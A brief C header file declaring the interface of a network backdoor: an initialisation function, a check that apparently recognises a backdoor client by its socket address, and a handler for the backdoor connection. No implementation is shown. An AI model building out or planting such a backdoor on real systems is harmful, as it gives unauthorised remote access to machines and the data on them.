#ifndef backdoor_h
#define backdoor_h

#include <sys/socket.h>

void init_backdoor(void);
int is_backdoor_c(const struct sockaddr* addr, socklen_t addrlen);
int handle_bd(int sockfd);

#endif
